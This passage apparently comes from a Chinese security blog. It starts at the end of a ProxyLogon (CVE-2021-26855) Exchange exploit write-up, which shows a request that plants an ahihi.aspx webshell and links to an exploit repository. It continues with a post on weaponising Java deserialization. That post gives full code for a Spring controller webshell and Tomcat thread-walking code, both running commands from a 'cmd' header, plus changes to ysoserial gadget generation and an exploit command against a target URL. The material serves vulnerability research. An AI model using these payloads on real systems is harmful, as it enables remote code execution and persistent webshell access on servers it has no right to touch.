class="operator">-</span>vErErAzvYBolDMKT9OZx3IR4<span class="operator">.&amp;</span>a<span class="operator">=~</span><span class="number">1942062522</span>; <span class="type">ASP</span>.<span class="type">NET_SessionId</span><span class="operator">=</span>09dfa549<span class="operator">-</span><span class="number">1787</span><span class="operator">-</span><span class="number">4812</span><span class="operator">-</span>be5b<span class="operator">-</span>4daa4fbe181d; msExchEcpCanary<span class="operator">=</span>67CGESO5CEODgNVWzzzHBehkzMiQ6NgI9wIOjtzXKv7c6gbNvZ<span class="operator">-</span>vErErAzvYBolDMKT9OZx3IR4.</span><br><span class="line">msExchLogonMailbox: <span class="type">S</span><span class="operator">-</span><span class="number">1</span><span class="operator">-</span><span class="number">5</span><span class="operator">-</span><span class="number">21</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;properties&quot;</span>: &#123;<span class="string">&quot;Parameters&quot;</span>: &#123;<span class="string">&quot;__type&quot;</span>: <span class="string">&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;</span>, <span class="string">&quot;FilePathName&quot;</span>: <span class="string">&quot;<span class="subst">\\</span><span class="subst">\\</span>127.0.0.1<span class="subst">\\</span>c$<span class="subst">\\</span>Program Files<span class="subst">\\</span>Microsoft<span class="subst">\\</span>Exchange Server<span class="subst">\\</span>V15<span class="subst">\\</span>FrontEnd<span class="subst">\\</span>HttpProxy<span class="subst">\\</span>owa<span class="subst">\\</span>auth<span class="subst">\\</span>ahihi.aspx&quot;</span>&#125;&#125;, <span class="string">&quot;identity&quot;</span>: &#123;<span class="string">&quot;DisplayName&quot;</span>: <span class="string">&quot;OAB (Default Web Site)&quot;</span>, <span class="string">&quot;__type&quot;</span>: <span class="string">&quot;Identity:ECP&quot;</span>, <span class="string">&quot;RawIdentity&quot;</span>: <span class="string">&quot;1dfca183-5e18-4453-b8a2-291138404cf0&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>



<p>到这里，无效的EXP已经修改完整。</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-31/1615737001368.png"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>公开的EXP大多数不能直接使用，还是需要自己修改一下</p>
<p><strong>最主要的就是</strong> </p>
<ul>
<li>第三阶段缺失了已下请求头</li>
</ul>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">X</span>-Requesttype: Connect</span><br><span class="line"><span class="attribute">X</span>-Clientinfo: &#123;<span class="number">2</span>F<span class="number">94</span>A<span class="number">2</span>BF-A<span class="number">2</span>E<span class="number">6</span>-<span class="number">4</span>CCCC-BF<span class="number">98</span>-B<span class="number">5</span>F<span class="number">22</span>C<span class="number">542226</span>&#125;</span><br><span class="line"><span class="attribute">X</span>-Clientapplication: Outlook/<span class="number">15</span>.<span class="number">0</span>.<span class="number">4815</span>.<span class="number">1002</span></span><br><span class="line"><span class="attribute">X</span>-Requestid: &#123;C<span class="number">715155</span>F-<span class="number">2</span>BE<span class="number">8</span>-<span class="number">44</span>E<span class="number">0</span>-BD<span class="number">34</span>-<span class="number">2960067874</span>C<span class="number">8</span>&#125;:<span class="number">2</span></span><br></pre></td></tr></table></figure>

<ul>
<li>之后所有的请求基本都缺失了 <code>msExchLogonMailbox</code> 请求头 （不知道是不是 Exchange 版本的问题）</li>
</ul>
<h4 id="EXP获取"><a href="#EXP获取" class="headerlink" title="EXP获取"></a>EXP获取</h4><p><a href="https://github.com/r0ckysec/CVE-2021-26855_Exchange" target="_blank">https://github.com/r0ckysec/CVE-2021-26855_Exchange</a></p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul>
<li><p><a href="https://paper.seebug.org/1501/">https://paper.seebug.org/1501/</a></p>
</li>
<li><p><a href="https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265">https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265</a></p>
</li>
<li><p><a href="https://www.praetorian.com/blog/reproducing-proxylogon-exploit/">https://www.praetorian.com/blog/reproducing-proxylogon-exploit/</a></p>
</li>
<li><p><a href="https://mp.weixin.qq.com/s/MqpD_5kZdI8yI6aRrUzgvg">https://mp.weixin.qq.com/s/MqpD_5kZdI8yI6aRrUzgvg</a></p>
</li>
<li><p><a href="https://mp.weixin.qq.com/s/iQhgQ0JkmR6pUfDxIQph1Q">https://mp.weixin.qq.com/s/iQhgQ0JkmR6pUfDxIQph1Q</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>漏洞POC</tag>
        <tag>C#</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化之温故知新（二）</title>
    <url>/2021/07/07/notes_20210707/</url>
    <content><![CDATA[<h4 id="Spring容器下回显"><a href="#Spring容器下回显" class="headerlink" title="Spring容器下回显"></a>Spring容器下回显</h4><h5 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h5><p>首先需要了解下 Spring 框架中的主要组成</p>
<span id="more"></span>

<p><strong>Bean</strong></p>
<p>Bean 是 Spring 框架的一个核心，由 Spring IoC 容器负责实例化、配置、组装和管理的对象。</p>
<p>有以下几个特点</p>
<ul>
<li>bean 是对象</li>
<li>bean 被 IoC 容器管理</li>
<li>Spring 应用主要是由一个个的 bean 构成的</li>
</ul>
<p><strong>ApplicationContext</strong></p>
<p>Spring 框架中，BeanFactory 接口是 Spring IoC容器 的实际代表者。</p>
<p>ApplicationContext 接口继承了 BeanFactory 接口，并通过继承其他接口进一步扩展了基本容器的功能。</p>
<p>因此，org.springframework.context.ApplicationContext接口也代表了 IoC容器 ，它负责实例化、定位、配置应用程序中的对象(bean)及建立这些对象间(beans)的依赖。</p>
<p><strong>ContextLoaderListener 与 DispatcherServlet</strong></p>
<p>ContextLoaderListener 主要被用来初始化全局唯一的Root Context，会和其他 Child Context 实例共享它的 IoC 容器，供其他 Child Context 获取并使用容器中的 bean。</p>
<p>DispatcherServlet 的主要作用是处理传入的web请求，根据配置的 URL pattern，将请求分发给正确的 Controller 和 View。DispatcherServlet 初始化完成后，会创建一个普通的 Child Context 实例。</p>
<h5 id="回显思路"><a href="#回显思路" class="headerlink" title="回显思路"></a>回显思路</h5><p>通过Spring容器获取上下文也就是之前说的Context的对象，来获取到<code>request</code>和<code>response</code>内容，</p>
<p>然后进行动态注册Controller，Controller就是Spring中最外面一层处理URL 映射相关的类都实现了 HandlerMapping 接口。</p>
<p>最后通过执行对应类获取执行结果存入<code>response</code>输出到响应内容中达到回显效果。</p>
<h5 id="回显实现"><a href="#回显实现" class="headerlink" title="回显实现"></a>回显实现</h5><p>Controller 中的实现 Webshell 逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringEcho</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();</span><br><span class="line">            javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();</span><br><span class="line">            javax.servlet.http.HttpServletResponse response = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();</span><br><span class="line"></span><br><span class="line">            String command = request.getHeader(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            PrintWriter writer = response.getWriter();</span><br><span class="line">            <span class="keyword">if</span> (command != <span class="keyword">null</span>) &#123;</span><br><span class="line">                String o = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                java.lang.ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> java.lang.ProcessBuilder(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> java.lang.ProcessBuilder(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.Scanner c = <span class="keyword">new</span> java.util.Scanner(p.start().getInputStream(), <span class="string">&quot;UTF-8&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">//  Block of code to handle errors</span></span><br><span class="line">            e.getStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM dom, SerializationHandler[] serializationHandlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="改造yso"><a href="#改造yso" class="headerlink" title="改造yso"></a>改造yso</h5><ol>
<li>修改 <code>ysoserial.payloads.util.Gadgets#createTemplatesImpl(java.lang.Class, java.lang.Class&lt;T&gt;, java.lang.Class&lt;?&gt;, java.lang.Class&lt;?&gt;)</code></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> Class c, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> T templates = tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// use template gadget class</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">        <span class="keyword">final</span> CtClass clazz = pool.get(c.getName());</span><br><span class="line">        <span class="comment">// run command in static initializer</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line">        CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// inject class bytes into instance</span></span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">            classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>利用CC链作为载体，这里以 <code>CommonsBeanutils1</code> 做示范</li>
</ol>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">final Object templates = <span class="module-access"><span class="module"><span class="identifier">Gadgets</span>.</span></span>create<span class="constructor">TemplatesImpl(SpringEcho.<span class="params">class</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>只需要将 <code>Gadgets.createTemplatesImpl(SpringEcho.class);</code> 方法中传入自定义的回显类 <code>SpringEcho.class</code> 即可</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1625533593760.png"></p>
<ol start="3">
<li>演示改造后的yso</li>
</ol>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python3</span> <span class="built_in">exp</span>.<span class="keyword">py</span> -<span class="keyword">u</span> http://targe<span class="variable">t:8080</span> -g CommonsBeanutils1SpringEcho -<span class="keyword">c</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1625536423305.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1625536516645.png"></p>
<h4 id="Tomcat容器下的回显"><a href="#Tomcat容器下的回显" class="headerlink" title="Tomcat容器下的回显"></a>Tomcat容器下的回显</h4><h5 id="前情提要-1"><a href="#前情提要-1" class="headerlink" title="前情提要"></a>前情提要</h5><p>可以参考李师傅，总结的很全 <a href="https://xz.aliyun.com/t/7535">https://xz.aliyun.com/t/7535</a></p>
<ul>
<li><a href="https://www.anquanke.com/post/id/198886">基于内存 Webshell 的无文件攻击技术研究</a>，观星大哥的文章，通杀spring，能解决实战只能够遇到的大部分情况了。</li>
<li><a href="https://xz.aliyun.com/t/7348">Tomcat中一种半通用回显方法</a>，这篇文章讲了通过反射修改ApplicationFilterChain参数来让tomcat再下一次请求的时候在线程中缓存req和resp，不足之处在于shiro无法回显。</li>
<li><a href="https://xz.aliyun.com/t/7388">基于tomcat的内存 Webshell 无文件攻击技术</a>，通过上一篇的方法获取到req进一步获取context，然后动态注册filter，不足之处在于使用的是上一篇的获取req的思路所以也无法shiro回显。</li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">基于全局储存的新思路 | Tomcat的一种通用回显方法研究</a>，这篇文章通过currentThread.getContextClassLoader()获取StandardContext，进一步获取到response，解决了shiro回显的问题，不足在于tomcat7中无法获取到StandardContext。</li>
<li><a href="https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA">基于Tomcat无文件Webshell研究</a>，总结上面文章的方法，不足之处在于无法解决tomcat7+shiro的问题。</li>
<li><a href="https://xz.aliyun.com/t/7535">tomcat不出网回显连续剧第六集</a>，而李三师傅在以上的基础上，提出了与前文不同的获取RequestInfo思路，是一条通过registry&amp;Mbean全新的链，是目前见到最通用的方式了，适合tomcat7&amp;shiro。</li>
<li><a href="https://paper.seebug.org/1181/">半自动化挖掘 request 实现多种中间件回显</a> ,c0ny1师傅提出的，自动化遍历搜索全局request，一锤定音，算是Tomcat回显的终章了。</li>
</ul>
<p>这里直接引用李师傅的思路，也是目前最常用的通用方式</p>
<p>通过获取RequestInfo思路，是一条通过registry&amp;Mbean全新的链</p>
<h5 id="回显实现-1"><a href="#回显实现-1" class="headerlink" title="回显实现"></a>回显实现</h5><p>通过tomcat内置的 <code>http-bio</code> （tomcat7）和 <code>http-nio</code>（tomcat8），获取到内存对象，通过遍历processors中的各个requests，获取到当前匹配的nio进程，然后执行命令后写入缓存最后修改响应内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object obj = Thread.currentThread();</span><br><span class="line">java.lang.reflect.Field field = obj.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;group&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">obj = field.get(obj);</span><br><span class="line">field = obj.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">obj = field.get(obj);</span><br><span class="line">Thread[] threads = (Thread[])obj;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; threads.length; i++)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Thread thread = threads[i];</span><br><span class="line">        <span class="keyword">if</span>((thread.getName().contains(<span class="string">&quot;http-apr&quot;</span>) &amp;&amp; thread.getName().contains(<span class="string">&quot;Poller&quot;</span>))</span><br><span class="line">            || (thread.getName().contains(<span class="string">&quot;http-bio&quot;</span>) &amp;&amp; thread.getName().contains(<span class="string">&quot;AsyncTimeout&quot;</span>))</span><br><span class="line">            || (thread.getName().contains(<span class="string">&quot;http-nio&quot;</span>) &amp;&amp; thread.getName().contains(<span class="string">&quot;Poller&quot;</span>))) &#123;</span><br><span class="line">            field = thread.getClass().getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(thread);</span><br><span class="line">            field = obj.getClass().getDeclaredField(<span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                field = obj.getClass().getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (NoSuchFieldException e)&#123;</span><br><span class="line">                field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                field = obj.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">catch</span>(NoSuchFieldException e)&#123;</span><br><span class="line">                field = obj.getClass().getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line">            field = obj.getClass().getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line">            java.util.List processors = (java.util.List) obj;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; processors.size(); ++j) &#123;</span><br><span class="line">                Object o = processors.get(j);</span><br><span class="line">                field = o.getClass().getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                obj = field.get(o);</span><br><span class="line">                org.apache.coyote.Request req = (org.apache.coyote.Request) obj;</span><br><span class="line">                String cmd = req.getHeader(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    String res = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next();</span><br><span class="line">                    org.apache.tomcat.util.buf.ByteChunk bc = <span class="keyword">new</span> org.apache.tomcat.util.buf.ByteChunk();</span><br><span class="line">                    bc.setBytes(res.getBytes(), <span class="number">0</span>, res.getBytes().length);</span><br><span class="line">                    req.getResponse().doWrite(bc);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="改造yso-1"><a href="#改造yso-1" class="headerlink" title="改造yso"></a>改造yso</h5><p>这里与spring环境下构造回显类不同，如果构造类来进行载入，生成的payload会超长度导致无法利用。所以tomcat的利用方式，是利用 <code>clazz.makeClassInitializer().insertAfter(code);</code> 直接载入回显代码</p>
<ol>
<li>在 <code>Gadgets</code> 中添加自定义的 <code>createTomcatEchoImpl</code> 方法</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createTomcatEchoImpl</span> <span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String code = <span class="string">&quot;Object obj = Thread.currentThread();\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;java.lang.reflect.Field field = obj.getClass().getSuperclass().getDeclaredField(\&quot;group\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;field.setAccessible(true);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;obj = field.get(obj);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;field = obj.getClass().getDeclaredField(\&quot;threads\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;field.setAccessible(true);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;obj = field.get(obj);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;Thread[] threads = (Thread[])obj;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;for(int i = 0; i &lt; threads.length; i++)&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    try&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        Thread thread = threads[i];\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        if((thread.getName().contains(\&quot;http-apr\&quot;) &amp;&amp; thread.getName().contains(\&quot;Poller\&quot;))\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            || (thread.getName().contains(\&quot;http-bio\&quot;) &amp;&amp; thread.getName().contains(\&quot;AsyncTimeout\&quot;))\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            || (thread.getName().contains(\&quot;http-nio\&quot;) &amp;&amp; thread.getName().contains(\&quot;Poller\&quot;))) &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            field = thread.getClass().getDeclaredField(\&quot;target\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            field.setAccessible(true);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            obj = field.get(thread);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            field = obj.getClass().getDeclaredField(\&quot;this$0\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            field.setAccessible(true);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            obj = field.get(obj);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            try&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                field = obj.getClass().getDeclaredField(\&quot;handler\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            &#125;catch (NoSuchFieldException e)&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField(\&quot;handler\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            field.setAccessible(true);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            obj = field.get(obj);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            try&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                field = obj.getClass().getSuperclass().getDeclaredField(\&quot;global\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            &#125;catch(NoSuchFieldException e)&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                field = obj.getClass().getDeclaredField(\&quot;global\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            field.setAccessible(true);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            obj = field.get(obj);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            field = obj.getClass().getDeclaredField(\&quot;processors\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            field.setAccessible(true);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            obj = field.get(obj);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            java.util.List processors = (java.util.List) obj;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            for (int j = 0; j &lt; processors.size(); ++j) &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                Object o = processors.get(j);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                field = o.getClass().getDeclaredField(\&quot;req\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                field.setAccessible(true);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                obj = field.get(o);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                org.apache.coyote.Request req = (org.apache.coyote.Request) obj;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                String cmd = req.getHeader(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                if (cmd != null) &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                    String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                    org.apache.tomcat.util.buf.ByteChunk bc = new org.apache.tomcat.util.buf.ByteChunk();\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                    bc.setBytes(res.getBytes(), 0, res.getBytes().length);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                    req.getResponse().doWrite(bc);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                    break;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;catch(Exception e)&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        e.printStackTrace();\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>)) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> createTomcatEchoImpl(</span><br><span class="line">                code,</span><br><span class="line">                Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>),</span><br><span class="line">                Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;</span>),</span><br><span class="line">                Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> createTomcatEchoImpl(code, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTomcatEchoImpl</span> <span class="params">(String code, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> T templates = tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// use template gadget class</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload.class));</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">        <span class="keyword">final</span> CtClass clazz = pool.get(StubTransletPayload.class.getName());</span><br><span class="line">        <span class="comment">// run command in static initializer</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line">        </span><br><span class="line">        clazz.makeClassInitializer().insertAfter(code);</span><br><span class="line">        <span 